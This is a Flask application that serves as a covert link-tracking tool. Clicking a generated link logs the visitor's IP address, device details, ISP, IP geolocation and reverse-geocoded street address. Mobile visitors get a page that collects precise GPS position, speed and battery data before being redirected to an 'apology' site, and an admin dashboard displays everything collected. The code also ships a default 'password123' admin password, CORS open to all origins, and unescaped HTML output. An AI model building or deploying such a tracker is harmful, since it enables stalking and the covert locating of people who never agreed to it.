from flask import Flask, render_template, redirect, url_for, request, jsonify, g, session
import uuid
import requests
import sqlite3
import os
import json
import hashlib
import time
from datetime import datetime
from functools import wraps
from user_agents import parse

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'your-secret-key-change-this-in-production')

# Admin credentials (change these!)
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'password123')

# Redirect URL (your enhanced apology website!)
REDIRECT_URL = 'https://apology-7duy.onrender.com'

# Production configuration
if os.environ.get('RAILWAY_ENVIRONMENT') or os.environ.get('RENDER') or os.environ.get('PORT'):
    app.config['DEBUG'] = False
    DATABASE = '/tmp/events.db' if os.environ.get('RENDER') else 'events.db'
else:
    app.config['DEBUG'] = True
    DATABASE = 'events.db'

# CORS support for apology integration
@app.after_request
def after_request(response):
    """Add CORS headers to allow apology website to send data"""
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With'
    response.headers['Access-Control-Max-Age'] = '3600'
    return response

@app.route('/api/apology-click', methods=['OPTIONS'])
def handle_preflight():
    """Handle CORS preflight requests"""
    return '', 200

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

def init_db():
    """Initialize enhanced database with comprehensive user tracking"""
    try:
        with app.app_context():
            db = sqlite3.connect(DATABASE)
            
            # Drop old table if exists and create new enhanced one
            db.execute('DROP TABLE IF EXISTS events')
            
            # Create comprehensive events table
            db.execute('''CREATE TABLE events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                ip_address TEXT,
                user_agent TEXT,
                browser TEXT,
                os TEXT,
                device_type TEXT,
                device_brand TEXT,
                country TEXT,
                region TEXT,
                city TEXT,
                timezone TEXT,
                latitude TEXT,
                longitude TEXT,
                accuracy TEXT,
                altitude TEXT,
                speed TEXT,
                heading TEXT,
                location_source TEXT,
                address TEXT,
                isp TEXT,
                organization TEXT,
                referrer TEXT,
                language TEXT,
                screen_resolution TEXT,
                viewport_size TEXT,
                connection_type TEXT,
                battery_level TEXT,
                online_status TEXT,
                timestamp TEXT,
                response_time_ms INTEGER
            )''')
            
            # Create links table for better tracking
            db.execute('''CREATE TABLE links (
                id TEXT PRIMARY KEY,
                created_at TEXT,
                click_count INTEGER DEFAULT 0,
                last_clicked TEXT
            )''')
            
            db.commit()
            db.close()
            print(f"Enhanced database initialized successfully at {DATABASE}")
    except Exception as e:
        print(f"Error initializing database: {e}")

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def require_auth(f):
    """Decorator for admin authentication"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'authenticated' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# Initialize database
init_db()

@app.route('/', methods=['GET'])
def home():
    """Enhanced homepage with statistics"""
    start_time = time.time()
    
    try:
        db = get_db()
        
        # Get statistics
        total_links = db.execute('SELECT COUNT(*) FROM links').fetchone()[0]
        total_clicks = db.execute('SELECT SUM(click_count) FROM links').fetchone()[0] or 0
        total_visitors = db.execute('SELECT COUNT(DISTINCT ip_address) FROM events').fetchone()[0]
        
        response_time = int((time.time() - start_time) * 1000)
        
        return render_template('home.html',
            link_url=request.args.get('link'),
            total_links=total_links,
            total_clicks=total_clicks,
            total_visitors=total_visitors,
            response_time=response_time
        )
    except Exception as e:
        print(f"Error loading homepage: {e}")
        return render_template('home.html')

@app.route('/create_link', methods=['POST'])
def create_link():
    """Create a new tracking link"""
    try:
        link_id = str(uuid.uuid4())[:8]
        
        db = get_db()
        db.execute('INSERT INTO links (id, created_at) VALUES (?, ?)',
                  (link_id, datetime.utcnow().isoformat()))
        db.commit()
        
        link_url = request.url_root + f'l/{link_id}'
        return redirect(url_for('home') + f'?link={link_url}')
        
    except Exception as e:
        print(f"Error creating link: {e}")
        return redirect(url_for('home'))

@app.route('/l/<link_id>')
def track_and_redirect(link_id):
    """Enhanced tracking with comprehensive data collection and direct redirect"""
    start_time = time.time()
    
    try:
        # Get client information
        user_agent_string = request.headers.get('User-Agent', '')
        user_agent = parse(user_agent_string)
        client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        if client_ip and ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        
        # Get comprehensive client data
        client_data = {
            'link_id': link_id,
            'ip_address': client_ip,
            'user_agent': user_agent_string,
            'browser': f"{user_agent.browser.family} {user_agent.browser.version_string}",
            'os': f"{user_agent.os.family} {user_agent.os.version_string}",
            'device_type': user_agent.device.family,
            'device_brand': user_agent.device.brand or 'Unknown',
            'referrer': request.headers.get('Referer', 'Direct'),
            'language': request.headers.get('Accept-Language', '').split(',')[0] if request.headers.get('Accept-Language') else 'Unknown',
            'timestamp': datetime.utcnow().isoformat(),
            'response_time_ms': 0  # Will be updated after processing
        }
        
        # Get IP geolocation
        geo_data = get_ip_geolocation(client_ip)
        client_data.update({
            'country': geo_data.get('country_name', 'Unknown'),
            'region': geo_data.get('region_name', 'Unknown'),
            'city': geo_data.get('city', 'Unknown'),
            'timezone': geo_data.get('timezone', 'Unknown'),
            'latitude': str(geo_data.get('latitude', 'Unknown')),
            'longitude': str(geo_data.get('longitude', 'Unknown')),
            'location_source': 'ip_geolocation',
            'isp': geo_data.get('isp', 'Unknown'),
            'organization': geo_data.get('org', 'Unknown')
        })
        
        # Get address from coordinates if available
        if client_data['latitude'] != 'Unknown' and client_data['longitude'] != 'Unknown':
            try:
                address = get_address_from_coords(client_data['latitude'], client_data['longitude'])
                client_data['address'] = address
            except:
                client_data['address'] = 'Address lookup failed'
        
        # Calculate response time
        client_data['response_time_ms'] = int((time.time() - start_time) * 1000)
        
        # Save to database
        db = get_db()
        
        # Insert comprehensive event data
        columns = ', '.join(client_data.keys())
        placeholders = ', '.join(['?'] * len(client_data))
        query = f'INSERT INTO events ({columns}) VALUES ({placeholders})'
        
        db.execute(query, list(client_data.values()))
        
        # Update link click count
        db.execute('UPDATE links SET click_count = click_count + 1, last_clicked = ? WHERE id = ?',
                  (datetime.utcnow().isoformat(), link_id))
        
        db.commit()
        
        print(f"[Track] {client_ip} clicked {link_id} - Response: {client_data['response_time_ms']}ms")
        
        # Check if it's a mobile device - show tracking page for better mobile experience
        is_mobile = user_agent.is_mobile or user_agent.is_tablet
        
        if is_mobile:
            # Show enhanced tracking page for mobile with GPS collection
            return render_template('tracking_redirect.html', redirect_url=REDIRECT_URL)
        else:
            # Direct redirect for desktop
            return redirect(REDIRECT_URL)
        
    except Exception as e:
        print(f"Error tracking click: {e}")
        # Still redirect even if tracking fails
        return redirect(REDIRECT_URL)

@app.route('/save_location', methods=['POST'])
def save_precise_location():
    """Save precise GPS location from browser"""
    try:
        data = request.json
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        accuracy = data.get('accuracy')
        altitude = data.get('altitude')
        speed = data.get('speed')
        heading = data.get('heading')
        
        client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        if client_ip and ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        
        # Update the most recent event for this IP with precise GPS data
        db = get_db()
        
        address = get_address_from_coords(latitude, longitude)
        
        # Update latest event from this IP with GPS data
        db.execute('''UPDATE events SET 
                     latitude = ?, longitude = ?, accuracy = ?, altitude = ?,
                     speed = ?, heading = ?, location_source = ?, address = ?
                     WHERE ip_address = ? AND id = (
                         SELECT MAX(id) FROM events WHERE ip_address = ?
                     )''', 
                  (str(latitude), str(longitude), str(accuracy), str(altitude),
                   str(speed), str(heading), 'browser_gps', address,
                   client_ip, client_ip))
        
        db.commit()
        
        return jsonify({
            'status': 'success',
            'latitude': latitude,
            'longitude': longitude,
            'address': address,
            'source': 'browser_gps'
        })
        
    except Exception as e:
        print(f"Error saving precise location: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/apology-click', methods=['POST'])
def handle_apology_click():
    """Handle apology button clicks with comprehensive tracking"""
    start_time = time.time()
    
    try:
        data = request.json
        
        # Get client information
        user_agent_string = request.headers.get('User-Agent', '')
        user_agent = parse(user_agent_string)
        client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        if client_ip and ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        
        # Create comprehensive tracking data
        tracking_data = {
            'link_id': f"apology-{data.get('button_type', 'unknown')}-{int(time.time())}",
            'ip_address': client_ip,
            'user_agent': user_agent_string,
            'browser': f"{user_agent.browser.family} {user_agent.browser.version_string}",
            'os': f"{user_agent.os.family} {user_agent.os.version_string}",
            'device_type': user_agent.device.family,
            'device_brand': user_agent.device.brand or 'Unknown',
            'referrer': data.get('referrer', 'apology-page'),
            'language': request.headers.get('Accept-Language', '').split(',')[0] if request.headers.get('Accept-Language') else 'Unknown',
            'timestamp': datetime.utcnow().isoformat(),
            'response_time_ms': 0  # Will be updated after processing
        }
        
        # Add apology-specific data
        tracking_data.update({
            'country': data.get('country', 'Unknown'),
            'region': data.get('region', 'Unknown'),
            'city': data.get('city', 'Unknown'),
            'timezone': data.get('timezone', 'Unknown'),
            'latitude': str(data.get('latitude', 'Unknown')),
            'longitude': str(data.get('longitude', 'Unknown')),
            'accuracy': str(data.get('accuracy', 'Unknown')),
            'altitude': str(data.get('altitude', 'Unknown')),
            'speed': str(data.get('speed', 'Unknown')),
            'heading': str(data.get('heading', 'Unknown')),
            'location_source': data.get('location_source', 'browser_gps'),
            'screen_resolution': data.get('screen_resolution', 'Unknown'),
            'viewport_size': data.get('viewport_size', 'Unknown'),
            'connection_type': data.get('connection_type', 'Unknown'),
            'battery_level': str(data.get('battery_level', 'Unknown')),
            'online_status': str(data.get('online_status', 'Unknown')),
            'isp': data.get('isp', 'Unknown'),
            'organization': data.get('organization', 'Unknown')
        })
        
        # Get IP geolocation as fallback if GPS not available
        if tracking_data['latitude'] == 'Unknown' or tracking_data['longitude'] == 'Unknown':
            geo_data = get_ip_geolocation(client_ip)
            tracking_data.update({
                'country': geo_data.get('country_name', 'Unknown'),
                'region': geo_data.get('region_name', 'Unknown'),
                'city': geo_data.get('city', 'Unknown'),
                'timezone': geo_data.get('timezone', 'Unknown'),
                'latitude': str(geo_data.get('latitude', 'Unknown')),
                'longitude': str(geo_data.get('longitude', 'Unknown')),
                'location_source': 'ip_geolocation',
                'isp': geo_data.get('isp', 'Unknown'),
                'organization': geo_data.get('org', 'Unknown')
            })
        
        # Get address from coordinates
        if tracking_data['latitude'] != 'Unknown' and tracking_data['longitude'] != 'Unknown':
            try:
                lat = float(tracking_data['latitude'])
                lng = float(tracking_data['longitude'])
                address = get_address_from_coords(lat, lng)
                tracking_data['address'] = address
            except:
                tracking_data['address'] = 'Unknown'
        else:
            tracking_data['address'] = 'Unknown'
        
        # Calculate response time
        tracking_data['response_time_ms'] = int((time.time() - start_time) * 1000)
        
        # Store in database
        db = get_db()
        
        # Insert comprehensive event data
        db.execute('''INSERT INTO events (
            link_id, ip_address, user_agent, browser, os, device_type, device_brand,
            country, region, city, timezone, latitude, longitude, accuracy, altitude,
            speed, heading, location_source, address, isp, organization, referrer,
            language, screen_resolution, viewport_size, connection_type, battery_level,
            online_status, timestamp, response_time_ms
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
        (tracking_data['link_id'], tracking_data['ip_address'], tracking_data['user_agent'],
         tracking_data['browser'], tracking_data['os'], tracking_data['device_type'],
         tracking_data['device_brand'], tracking_data['country'], tracking_data['region'],
         tracking_data['city'], tracking_data['timezone'], tracking_data['latitude'],
         tracking_data['longitude'], tracking_data['accuracy'], tracking_data['altitude'],
         tracking_data['speed'], tracking_data['heading'], tracking_data['location_source'],
         tracking_data['address'], tracking_data['isp'], tracking_data['organization'],
         tracking_data['referrer'], tracking_data['language'], tracking_data['screen_resolution'],
         tracking_data['viewport_size'], tracking_data['connection_type'], tracking_data['battery_level'],
         tracking_data['online_status'], tracking_data['timestamp'], tracking_data['response_time_ms']))
        
        # Also update links table for tracking
        db.execute('''INSERT OR IGNORE INTO links (id, created_at, click_count, last_clicked) 
                     VALUES (?, ?, 0, ?)''',
                  (tracking_data['link_id'], tracking_data['timestamp'], tracking_data['timestamp']))
        
        db.execute('''UPDATE links SET click_count = click_count + 1, last_clicked = ? 
                     WHERE id = ?''',
                  (tracking_data['timestamp'], tracking_data['link_id']))
        
        db.commit()
        
        return jsonify({
            'status': 'success',
            'message': 'Apology interaction tracked successfully',
            'button_type': data.get('button_type'),
            'location': {
                'latitude': tracking_data['latitude'],
                'longitude': tracking_data['longitude'],
                'address': tracking_data['address']
            },
            'tracking_id': tracking_data['link_id']
        })
        
    except Exception as e:
        print(f"Error handling apology click: {e}")
        return jsonify({
            'status': 'error',
            'message': f'Failed to track interaction: {str(e)}'
        })

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Admin login"""
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['authenticated'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            return render_template('login.html', error="Invalid credentials")
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Admin logout"""
    session.pop('authenticated', None)
    return redirect(url_for('home'))

@app.route('/admin')
@require_auth
def admin_dashboard():
    """Comprehensive admin dashboard"""
    try:
        db = get_db()
        
        # Get comprehensive statistics
        total_events = db.execute('SELECT COUNT(*) FROM events').fetchone()[0]
        total_links = db.execute('SELECT COUNT(*) FROM links').fetchone()[0]
        total_clicks = db.execute('SELECT SUM(click_count) FROM links').fetchone()[0] or 0
        unique_ips = db.execute('SELECT COUNT(DISTINCT ip_address) FROM events').fetchone()[0]
        unique_countries = db.execute('SELECT COUNT(DISTINCT country) FROM events WHERE country != "Unknown"').fetchone()[0]
        
        # Get recent events (last 50)
        events = db.execute('''SELECT * FROM events 
                              ORDER BY id DESC LIMIT 50''').fetchall()
        
        # Get top countries
        top_countries = db.execute('''SELECT country, COUNT(*) as count 
                                     FROM events 
                                     WHERE country != "Unknown" 
                                     GROUP BY country 
                                     ORDER BY count DESC 
                                     LIMIT 10''').fetchall()
        
        # Get top browsers
        top_browsers = db.execute('''SELECT browser, COUNT(*) as count 
                                    FROM events 
                                    GROUP BY browser 
                                    ORDER BY count DESC 
                                    LIMIT 10''').fetchall()
        
        # Get performance stats
        avg_response_time = db.execute('SELECT AVG(response_time_ms) FROM events WHERE response_time_ms > 0').fetchone()[0] or 0
        
        # For mobile optimization, create a simplified dashboard
        user_agent = parse(request.headers.get('User-Agent', ''))
        is_mobile = user_agent.is_mobile or user_agent.is_tablet
        
        # Return the admin dashboard HTML (inline for now, could be moved to template later)
        dashboard_html = generate_admin_dashboard_html(
            total_events, total_links, total_clicks, unique_ips, unique_countries,
            events, top_countries, top_browsers, avg_response_time, is_mobile
        )
        
        return dashboard_html
        
    except Exception as e:
        return f"<h2>Dashboard Error</h2><p>{e}</p><br><a href='/logout'>Logout</a>"

def generate_admin_dashboard_html(total_events, total_links, total_clicks, unique_ips, 
                                unique_countries, events, top_countries, top_browsers, 
                                avg_response_time, is_mobile=False):
    """Generate admin dashboard HTML with mobile optimization"""
    
    mobile_class = 'mobile-dashboard' if is_mobile else ''
    mobile_style = '''
        .mobile-dashboard .stats-grid {
            grid-template-columns: repeat(2, 1fr) !important;
        }
        .mobile-dashboard .charts-grid {
            grid-template-columns: 1fr !important;
        }
        .mobile-dashboard .table-container {
            font-size: 0.8rem;
        }
        .mobile-dashboard th, .mobile-dashboard td {
            padding: 8px 4px;
        }
    ''' if is_mobile else ''
    
    dashboard_html = f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
        <title>📊 Admin Dashboard - URL Tracker</title>
        <meta name="theme-color" content="#667eea">
        <style>
            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }}
            
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: #f8f9fa;
                color: #333;
            }}
            
            .header {{
                background: linear-gradient(135deg, #667eea, #764ba2);
                color: white;
                padding: 20px;
                text-align: center;
                box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            }}
            
            .container {{
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px 15px;
            }}
            
            .stats-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 15px;
                margin-bottom: 30px;
            }}
            
            .stat-card {{
                background: white;
                padding: 20px;
                border-radius: 15px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.08);
                border-left: 5px solid #667eea;
                transition: transform 0.2s ease;
            }}
            
            .stat-card:hover {{
                transform: translateY(-3px);
            }}
            
            .stat-number {{
                font-size: 2rem;
                font-weight: bold;
                color: #667eea;
                margin-bottom: 5px;
            }}
            
            .stat-label {{
                color: #666;
                font-size: 0.85rem;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }}
            
            .section {{
                background: white;
                margin: 25px 0;
                border-radius: 15px;
                overflow: hidden;
                box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            }}
            
            .section-header {{
                background: #667eea;
                color: white;
                padding: 15px 20px;
                font-size: 1.1rem;
                font-weight: 600;
            }}
            
            .table-container {{
                overflow-x: auto;
                max-height: 500px;
                overflow-y: auto;
            }}
            
            table {{
                width: 100%;
                border-collapse: collapse;
            }}
            
            th, td {{
                padding: 10px 8px;
                text-align: left;
                border-bottom: 1px solid #e0e0e0;
                font-size: 0.85rem;
            }}
            
            th {{
                background: #f8f9fa;
                font-weight: 600;
                position: sticky;
                top: 0;
            }}
            
            tr:hover {{
                background: #f8f9fa;
            }}
            
            .actions {{
                padding: 15px;
                text-align: center;
                background: #f8f9fa;
                display: flex;
                flex-wrap: wrap;
                gap: 10px;
                justify-content: center;
            }}
            
            .btn {{
                background: #667eea;
                color: white;
                padding: 10px 20px;
                border: none;
                border-radius: 25px;
                text-decoration: none;
                display: inline-block;
                transition: all 0.3s ease;
                cursor: pointer;
                font-size: 0.9rem;
                touch-action: manipulation;
            }}
            
            .btn:hover, .btn:active {{
                background: #5a6fd8;
                transform: translateY(-2px);
            }}
            
            .btn.secondary {{
                background: #6c757d;
            }}
            
            .btn.secondary:hover {{
                background: #5a6268;
            }}
            
            .charts-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
                gap: 20px;
                margin: 25px 0;
            }}
            
            .chart {{
                background: white;
                padding: 20px;
                border-radius: 15px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            }}
            
            .chart h3 {{
                margin-bottom: 15px;
                color: #333;
                border-bottom: 2px solid #667eea;
                padding-bottom: 8px;
                font-size: 1rem;
            }}
            
            .chart-item {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 6px 0;
                border-bottom: 1px solid #f0f0f0;
                font-size: 0.85rem;
            }}
            
            .chart-label {{
                flex: 1;
                font-weight: 500;
            }}
            
            .chart-value {{
                background: #667eea;
                color: white;
                padding: 3px 10px;
                border-radius: 12px;
                font-size: 0.8rem;
                font-weight: 600;
            }}
            
            .location-source {{
                padding: 3px 6px;
                border-radius: 8px;
                font-size: 0.7rem;
                font-weight: 600;
            }}
            
            .source-gps {{
                background: #d4edda;
                color: #155724;
            }}
            
            .source-ip {{
                background: #d1ecf1;
                color: #0c5460;
            }}
            
            .auto-refresh {{
                position: fixed;
                top: 15px;
                right: 15px;
                background: rgba(255,255,255,0.95);
                padding: 8px 12px;
                border-radius: 20px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.1);
                font-size: 0.8rem;
                color: #28a745;
                z-index: 1000;
            }}
            
            {mobile_style}
            
            @media (max-width: 768px) {{
                .header {{
                    padding: 15px;
                }}
                
                .header h1 {{
                    font-size: 1.4rem;
                }}
                
                .container {{
                    padding: 15px 10px;
                }}
                
                .stats-grid {{
                    grid-template-columns: repeat(2, 1fr);
                    gap: 10px;
                }}
                
                .stat-card {{
                    padding: 15px;
                }}
                
                .stat-number {{
                    font-size: 1.5rem;
                }}
                
                .charts-grid {{
                    grid-template-columns: 1fr;
                    gap: 15px;
                }}
                
                .actions {{
                    flex-direction: column;
                    align-items: center;
                }}
                
                .btn {{
                    min-width: 140px;
                }}
            }}
        </style>
        <script>
            // Auto-refresh every 60 seconds
            setTimeout(() => location.reload(), 60000);
            
            function exportData() {{
                window.open('/admin/export', '_blank');
            }}
            
            // Add touch feedback for mobile
            document.addEventListener('DOMContentLoaded', function() {{
                const buttons = document.querySelectorAll('.btn');
                buttons.forEach(button => {{
                    button.addEventListener('touchstart', function() {{
                        this.style.transform = 'scale(0.95)';
                    }});
                    
                    button.addEventListener('touchend', function() {{
                        this.style.transform = '';
                    }});
                }});
            }});
        </script>
    </head>
    <body class="{mobile_class}">
        <div class="auto-refresh">
            🔄 Auto-refresh: 60s
        </div>
        
        <div class="header">
            <h1>📊 URL Tracker Dashboard</h1>
            <p>Comprehensive analytics and visitor tracking</p>
        </div>
        
        <div class="container">
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number">{total_events}</div>
                    <div class="stat-label">Total Events</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{total_links}</div>
                    <div class="stat-label">Links Created</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{total_clicks}</div>
                    <div class="stat-label">Total Clicks</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{unique_ips}</div>
                    <div class="stat-label">Unique Visitors</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{unique_countries}</div>
                    <div class="stat-label">Countries</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{avg_response_time:.0f}ms</div>
                    <div class="stat-label">Avg Response</div>
                </div>
            </div>
            
            <div class="charts-grid">
                <div class="chart">
                    <h3>🌍 Top Countries</h3>
    '''
    
    for country, count in top_countries:
        dashboard_html += f'''
                    <div class="chart-item">
                        <div class="chart-label">{country}</div>
                        <div class="chart-value">{count}</div>
                    </div>
        '''
    
    dashboard_html += '''
                </div>
                
                <div class="chart">
                    <h3>🌐 Top Browsers</h3>
    '''
    
    for browser, count in top_browsers:
        dashboard_html += f'''
                    <div class="chart-item">
                        <div class="chart-label">{browser}</div>
                        <div class="chart-value">{count}</div>
                    </div>
        '''
    
    dashboard_html += '''
                </div>
            </div>
            
            <div class="section">
                <div class="section-header">
                    📊 Recent Events (Last 50)
                </div>
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>IP</th>
                                <th>Location</th>
                                <th>Device</th>
                                <th>Source</th>
                                <th>Time</th>
                            </tr>
                        </thead>
                        <tbody>
    '''
    
    for event in events:
        location_display = f"{event['city']}, {event['country']}" if event['city'] != 'Unknown' else event['country']
        device_display = f"{event['browser']} on {event['os']}"
        
        source_class = 'source-gps' if event['location_source'] == 'browser_gps' else 'source-ip'
        source_icon = '📱' if event['location_source'] == 'browser_gps' else '🌐'
        source_text = 'GPS' if event['location_source'] == 'browser_gps' else 'IP'
        
        timestamp = datetime.fromisoformat(event['timestamp']).strftime('%m-%d %H:%M') if event['timestamp'] else 'N/A'
        
        dashboard_html += f'''
                            <tr>
                                <td>{event['ip_address']}</td>
                                <td>{location_display}</td>
                                <td>{device_display}</td>
                                <td><span class="location-source {source_class}">{source_icon}</span></td>
                                <td>{timestamp}</td>
                            </tr>
        '''
    
    dashboard_html += f'''
                        </tbody>
                    </table>
                </div>
                <div class="actions">
                    <button onclick="exportData()" class="btn">📥 Export</button>
                    <a href="/logout" class="btn secondary">🚪 Logout</a>
                    <a href="/" class="btn secondary">🏠 Home</a>
                </div>
            </div>
        </div>
    </body>
    </html>
    '''
    
    return dashboard_html

def get_ip_geolocation(ip):
    """Enhanced IP geolocation with multiple data points"""
    if ip in ['127.0.0.1', 'localhost'] or ip.startswith(('192.168.', '10.', '172.')):
        return {
            'city': 'Local Network',
            'region_name': 'Private Network', 
            'country_name': 'Local',
            'latitude': '0',
            'longitude': '0',
            'timezone': 'Local',
            'isp': 'Local ISP',
            'org': 'Private Network'
        }
    
    apis = [
        {
            'url': f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp,org',
            'city_key': 'city',
            'region_key': 'regionName',
            'country_key': 'country',
            'lat_key': 'lat',
            'lng_key': 'lon',
            'timezone_key': 'timezone',
            'isp_key': 'isp',
            'org_key': 'org'
        }
    ]
    
    for api in apis:
        try:
            response = requests.get(api['url'], timeout=5)
            data = response.json()
            
            if data.get('status') == 'success':
                return {
                    'city': data.get(api['city_key'], 'Unknown'),
                    'region_name': data.get(api['region_key'], 'Unknown'),
                    'country_name': data.get(api['country_key'], 'Unknown'),
                    'latitude': str(data.get(api['lat_key'], 'Unknown')),
                    'longitude': str(data.get(api['lng_key'], 'Unknown')),
                    'timezone': data.get(api['timezone_key'], 'Unknown'),
                    'isp': data.get(api['isp_key'], 'Unknown'),
                    'org': data.get(api['org_key'], 'Unknown')
                }
        except Exception as e:
            print(f"Geolocation API error: {e}")
            continue
    
    return {
        'city': 'Unknown',
        'region_name': 'Unknown',
        'country_name': 'Unknown',
        'latitude': 'Unknown',
        'longitude': 'Unknown',
        'timezone': 'Unknown',
        'isp': 'Unknown',
        'org': 'Unknown'
    }

def get_address_from_coords(lat, lng):
    """Get address from coordinates"""
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}&zoom=18"
        headers = {'User-Agent': 'LightningURLTracker/2.0'}
        response = requests.get(url, headers=headers, timeout=5)
        data = response.json()
        return data.get('display_name', 'Address not found')
    except:
        return 'Address unavailable'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port) 